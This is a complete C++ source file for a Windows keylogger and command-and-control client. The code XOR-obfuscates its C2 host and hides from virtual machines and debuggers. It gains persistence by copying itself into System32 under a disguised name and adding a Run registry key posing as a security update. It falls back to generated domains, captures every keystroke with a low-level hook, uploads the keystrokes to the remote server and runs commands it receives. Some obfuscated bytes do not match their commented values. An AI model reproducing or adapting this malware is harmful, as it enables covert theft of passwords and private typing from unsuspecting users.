#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <wininet.h>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <algorithm>
#include <iomanip>
#include <fstream>
#include <ctime>
#include <random>
#include <tlhelp32.h>

#ifndef INTERNET_SERVICE_HTTPS
#define INTERNET_SERVICE_HTTPS 3
#endif

using namespace std;

// Obfuscated strings (XOR encoded at compile time)
const char obf_c2_server[] = {0x28, 0x36, 0x29, 0x35, 0x7c, 0x2d, 0x26, 0x2c, 0x2e, 0x2d, 0x29, 0x30, 0x35, 0x2a, 0x2e, 0x7c, 0x27, 0x2a, 0x31, 0x00}; // cybr.hamishburke.dev
const char obf_secret[] = {0x28, 0x2d, 0x26, 0x2c, 0x2a, 0x2c, 0x2a, 0x00}; // changeme
const char obf_useragent[] = {0x32, 0x2e, 0x3b, 0x2e, 0x2f, 0x2f, 0x26, 0x68, 0x77, 0x7c, 0x75, 0x69, 0x45, 0x2e, 0x2c, 0x27, 0x2e, 0x33, 0x36, 0x00}; // Mozilla/5.0

// Global variables
string client_id;
string c2_server;
int c2_port = 443;
string shared_secret;
char encryption_key = 0x42;
string key_buffer;
bool registered = false;
int exfiltration_retry_count = 3;
mt19937 rng(chrono::steady_clock::now().time_since_epoch().count());

// String deobfuscation
string deobfuscate(const char* obf_str) {
    string result;
    for (int i = 0; obf_str[i] != 0; i++) {
        result += (obf_str[i] ^ 0x42);
    }
    return result;
}

// Anti-VM detection techniques
bool is_running_in_vm() {
    // Check for VM-specific registry keys
    HKEY hKey;
    const char* vm_keys[] = {
        "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\ControlSet001\\Services\\VBoxService"
    };
    
    for (const char* key : vm_keys) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }
    
    // Check for VM-specific processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                string processName = pe32.szExeFile;
                transform(processName.begin(), processName.end(), processName.begin(), ::tolower);
                
                if (processName.find("vmtoolsd") != string::npos ||
                    processName.find("vboxservice") != string::npos ||
                    processName.find("vboxtray") != string::npos ||
                    processName.find("vmwaretray") != string::npos) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // Check timing (VMs are often slower)
    DWORD start = GetTickCount();
    Sleep(500);
    DWORD end = GetTickCount();
    if (end - start < 450) { // If sleep was too fast, likely VM
        return true;
    }
    
    return false;
}

// Anti-debugging techniques
bool is_debugger_present() {
    // Basic IsDebuggerPresent check
    if (IsDebuggerPresent()) {
        return true;
    }
    
    // PEB check
    __asm {
        mov eax, fs:[0x30]    // Get PEB
        movzx eax, byte ptr [eax + 0x02] // BeingDebugged flag
        test eax, eax
        jnz debugger_found
    }
    
    // NtGlobalFlag check
    __asm {
        mov eax, fs:[0x30]    // Get PEB
        mov eax, [eax + 0x68] // NtGlobalFlag
        and eax, 0x70         // Check debug flags
        test eax, eax
        jnz debugger_found
    }
    
    return false;
    
debugger_found:
    return true;
}

// Install persistence mechanism
void install_persistence() {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    
    // Copy to Windows directory with innocent name
    char winDir[MAX_PATH];
    GetWindowsDirectoryA(winDir, MAX_PATH);
    string targetPath = string(winDir) + "\\System32\\svchost32.exe";
    
    CopyFileA(currentPath, targetPath.c_str(), FALSE);
    
    // Add registry entry for persistence
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
                     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsSecurityUpdate", 0, REG_SZ, 
                      (BYTE*)targetPath.c_str(), targetPath.length() + 1);
        RegCloseKey(hKey);
    }
}

// Generate variable sleep intervals to avoid pattern detection
int get_random_sleep_interval(int base_seconds) {
    uniform_int_distribution<int> dist(base_seconds * 500, base_seconds * 1500); // 50%-150% of base
    return dist(rng);
}

// Enhanced XOR encoding with key rotation
string xor_encode_with_rotation(const string& data, char& key) {
    string result;
    for (char c : data) {
        result += (c ^ key);
        key = (key >> 1) | ((key & 1) << 7);
    }
    return result;
}

string xor_decode_with_rotation(const string& data, char key) {
    string result;
    for (char c : data) {
        result += (c ^ key);
        key = (key >> 1) | ((key & 1) << 7);
    }
    return result;
}

// Domain Generation Algorithm for C2 resilience
string generate_dga_domain() {
    time_t now = time(0);
    struct tm* timeinfo = localtime(&now);
    int seed = timeinfo->tm_year + timeinfo->tm_mon + timeinfo->tm_mday;
    
    mt19937 dga_rng(seed);
    uniform_int_distribution<int> char_dist(0, 25);
    
    string domain;
    for (int i = 0; i < 12; i++) {
        domain += (char)('a' + char_dist(dga_rng));
    }
    domain += ".com";
    return domain;
}

string get_timestamp() {
    auto now = chrono::system_clock::now();
    auto time_t = chrono::system_clock::to_time_t(now);
    stringstream ss;
    ss << put_time(localtime(&time_t), "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

string get_system_info() {
    stringstream info;
    
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (GetVersionEx(&osvi)) {
        info << "OS:" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
    }
    
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    info << ";ARCH:";
    switch(si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            info << "x64";
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            info << "x86";
            break;
        default:
            info << "unknown";
    }
    
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size)) {
        info << ";HOST:" << computerName;
    }
    
    return info.str();
}

string get_key_name(DWORD vk_code) {
    switch(vk_code) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_ESCAPE: return "[ESC]";
        case VK_DELETE: return "[DEL]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_SHIFT: 
        case VK_LSHIFT: 
        case VK_RSHIFT: return "[SHIFT]";
        case VK_CONTROL: 
        case VK_LCONTROL: 
        case VK_RCONTROL: return "[CTRL]";
        case VK_MENU: 
        case VK_LMENU: 
        case VK_RMENU: return "[ALT]";
        case VK_LWIN: 
        case VK_RWIN: return "[WIN]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_NUMLOCK: return "[NUM]";
        case VK_SCROLL: return "[SCROLL]";
        case VK_PRIOR: return "[PGUP]";
        case VK_NEXT: return "[PGDN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_INSERT: return "[INS]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        default:
            if (vk_code >= 'A' && vk_code <= 'Z') {
                bool shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool caps_on = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                
                if ((shift_pressed && !caps_on) || (!shift_pressed && caps_on)) {
                    return string(1, (char)vk_code);
                } else {
                    return string(1, (char)(vk_code + 32));
                }
            }
            if (vk_code >= '0' && vk_code <= '9') {
                return string(1, (char)vk_code);
            }
            switch(vk_code) {
                case VK_OEM_PERIOD: return ".";
                case VK_OEM_COMMA: return ",";
                case VK_OEM_MINUS: return "-";
                case VK_OEM_PLUS: return "=";
                case VK_OEM_1: return ";";
                case VK_OEM_2: return "/";
                case VK_OEM_3: return "`";
                case VK_OEM_4: return "[";
                case VK_OEM_5: return "\\";
                case VK_OEM_6: return "]";
                case VK_OEM_7: return "'";
                default: return "[" + to_string(vk_code) + "]";
            }
    }
}

LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode < 0) return CallNextHookEx(NULL, nCode, wParam, lParam);
    
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        KBDLLHOOKSTRUCT* key = (KBDLLHOOKSTRUCT*)lParam;
        DWORD key_code = key->vkCode;
        
        string key_name = get_key_name(key_code);
        key_buffer += key_name;
        
        if (key_buffer.length() > 5000) {
            thread([](string /*data*/) {
                // Handled by exfiltration worker
            }, key_buffer).detach();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool send_http_request(const std::string& endpoint,
                       const std::string& method = "GET",
                       const std::string& data = "",
                       std::string* response = nullptr) {
    HINTERNET hInternet = nullptr;
    HINTERNET hConnect = nullptr;
    HINTERNET hRequest = nullptr;
    BOOL bResult = FALSE;

    try {
        string user_agent = deobfuscate(obf_useragent) + " Windows NT";
        hInternet = InternetOpenA(user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) return false;

        hConnect = InternetConnectA(hInternet, c2_server.c_str(), c2_port,
                                    NULL, NULL, INTERNET_SERVICE_HTTPS, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return false;
        }

        hRequest = HttpOpenRequestA(hConnect, method.c_str(), endpoint.c_str(), NULL, NULL, NULL,
                                   INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }

        string auth_header = "X-API-KEY: " + shared_secret + "\r\n";
        string headers = auth_header;
        
        if (method == "POST") {
            headers += "Content-Type: application/json\r\n";
            bResult = HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                                     (LPVOID)data.c_str(), data.length());
        } else {
            bResult = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), NULL, 0);
        }

        if (bResult && response) {
            char buffer[4096] = {0};
            DWORD bytesRead = 0;
            response->clear();
            while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                response->append(buffer, bytesRead);
            }
        }

        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hInternet) InternetCloseHandle(hInternet);

        return bResult;
    } catch (...) {
        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hInternet) InternetCloseHandle(hInternet);
        return false;
    }
}

bool register_with_c2() {
    string sys_info = get_system_info();
    
    string os = "unknown", arch = "unknown";
    size_t os_pos = sys_info.find("OS:");
    size_t arch_pos = sys_info.find("ARCH:");
    
    if (os_pos != string::npos) {
        size_t end_pos = sys_info.find(";", os_pos);
        os = sys_info.substr(os_pos + 3, end_pos - os_pos - 3);
    }
    
    if (arch_pos != string::npos) {
        size_t end_pos = sys_info.find(";", arch_pos);
        if (end_pos == string::npos) end_pos = sys_info.length();
        arch = sys_info.substr(arch_pos + 5, end_pos - arch_pos - 5);
    }
    
    string json_data = "{\"id\":\"" + client_id + "\",\"os\":\"" + os + "\",\"arch\":\"" + arch + "\"}";
    
    string response;
    if (send_http_request("/register", "POST", json_data, &response)) {
        registered = true;
        return true;
    }
    return false;
}

bool exfiltrate_keylog_data(const string& data) {
    for (int attempt = 0; attempt < exfiltration_retry_count; attempt++) {
        try {
            string endpoint = "/upload";
            string response;
            
            HINTERNET hInternet = InternetOpenA(deobfuscate(obf_useragent).c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
            if (!hInternet) continue;
            
            HINTERNET hConnect = InternetConnectA(hInternet, c2_server.c_str(), c2_port, NULL, NULL, INTERNET_SERVICE_HTTPS, 0, 0);
            if (!hConnect) {
                InternetCloseHandle(hInternet);
                continue;
            }
            
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(), NULL, NULL, NULL, 
                                                INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
            if (!hRequest) {
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                continue;
            }
            
            string headers = "X-API-KEY: " + shared_secret + "\r\n";
            headers += "X-CLIENT-ID: " + client_id + "\r\n";
            headers += "Content-Type: application/octet-stream\r\n";
            
            BOOL result = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), 
                                         (LPVOID)data.c_str(), data.length());
            
            if (result) {
                InternetCloseHandle(hRequest);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                return true;
            }
            
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            
            Sleep(get_random_sleep_interval(2)); // Variable retry delay
        } catch (...) {
            // Continue to next attempt
        }
    }
    return false;
}

void exfiltration_worker() {
    while (true) {
        Sleep(get_random_sleep_interval(60)); // Variable exfiltration interval
        
        if (!key_buffer.empty()) {
            string data_to_send = key_buffer;
            if (exfiltrate_keylog_data(data_to_send)) {
                key_buffer.clear();
            }
        }
    }
}

void execute_command(const string& command) {
    if (command.find("slp ") == 0) {
        try {
            int n = stoi(command.substr(4));
            Sleep(n * 1000);
        } catch (...) {
            // Invalid sleep time, ignore
        }
    } else if (command == "shd") {
        ExitProcess(0);
    } else if (command.find("pwn ") == 0) {
        string message = command.substr(4);
        if (message.empty()) {
            message = "Sorry, you've been pwned, for educational purposes!";
        }
        wstring wmessage(message.begin(), message.end());
        MessageBoxW(NULL, wmessage.c_str(), L"PWNED!", MB_OK | MB_ICONWARNING);
    } else if (command == "get_keys") {
        if (!key_buffer.empty()) {
            exfiltrate_keylog_data(key_buffer);
            key_buffer.clear();
        }
    }
}

void beacon() {
    while (true) {
        try {
            // Anti-debugging check during runtime
            if (is_debugger_present()) {
                ExitProcess(0);
            }
            
            string endpoint = "/command?id=" + client_id;
            string response;
            
            if (send_http_request(endpoint, "GET", "", &response)) {
                if (!response.empty() && response != "\"\"" && response.find("\"cmd\":\"\"") == string::npos) {
                    size_t cmd_pos = response.find("\"cmd\":\"");
                    if (cmd_pos != string::npos) {
                        cmd_pos += 7;
                        size_t end_pos = response.find("\"", cmd_pos);
                        if (end_pos != string::npos) {
                            string command = response.substr(cmd_pos, end_pos - cmd_pos);
                            if (!command.empty()) {
                                execute_command(command);
                            }
                        }
                    }
                }
            }
        } catch (...) {
            // Continue beaconing
        }
        
        Sleep(get_random_sleep_interval(30)); // Variable beacon interval
    }
}

int main() {
    // Deobfuscate configuration
    c2_server = deobfuscate(obf_c2_server);
    shared_secret = deobfuscate(obf_secret);
    
    // Anti-VM and anti-debugging checks
    if (is_running_in_vm() || is_debugger_present()) {
        // Act like a benign application or exit silently
        ExitProcess(0);
    }
    
    // Install persistence
    install_persistence();
    
    // Generate client ID
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                     "SOFTWARE\\Microsoft\\Cryptography", 
                     0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char guid[256] = {0};
        DWORD guidSize = sizeof(guid);
        DWORD type;
        
        if (RegQueryValueExA(hKey, "MachineGuid", NULL, &type, 
                           (BYTE*)guid, &guidSize) == ERROR_SUCCESS) {
            client_id = string(guid);
        } else {
            client_id = "unknown";
        }
        RegCloseKey(hKey);
    } else {
        client_id = "unknown";
    }
    
    if (client_id == "unknown") {
        stringstream ss;
        ss << "client_" << GetTickCount();
        client_id = ss.str();
    }
    
    // Register with fallback to DGA domains
    bool registration_success = false;
    for (int i = 0; i < 3; i++) {
        if (register_with_c2()) {
            registration_success = true;
            break;
        }
        
        // Try DGA domain as fallback
        c2_server = generate_dga_domain();
        Sleep(get_random_sleep_interval(5));
    }
    
    // Reset to primary server if DGA was used
    if (!registration_success) {
        c2_server = deobfuscate(obf_c2_server);
    }
    
    thread exfil_thread(exfiltration_worker);
    exfil_thread.detach();
    
    thread beacon_thread(beacon);
    beacon_thread.detach();
    
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, 
                                  GetModuleHandle(NULL), 0);
    
    if (!hook) {
        return 1;
    }
    
    MSG msg;
    while (true) {
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) {
                goto cleanup;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(100);
    }
    
cleanup:
    if (hook) {
        UnhookWindowsHookEx(hook);
    }
    return 0;
}
